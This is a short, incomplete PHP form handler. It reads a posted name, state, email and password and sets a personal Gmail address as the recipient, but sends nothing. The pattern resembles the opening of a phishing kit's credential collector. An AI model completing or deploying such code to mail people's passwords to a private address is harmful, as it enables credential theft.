<?php

if(isset($_POST["btn-send"]))
{
	$UserName = $_POST['name'];
	$UserState = $_POST['state'];
	$UserMail = $_POST['mail'];
	$UserPwd = $_POST['pwd'];

	$to = "amoorebell@gmail.com";
}

?>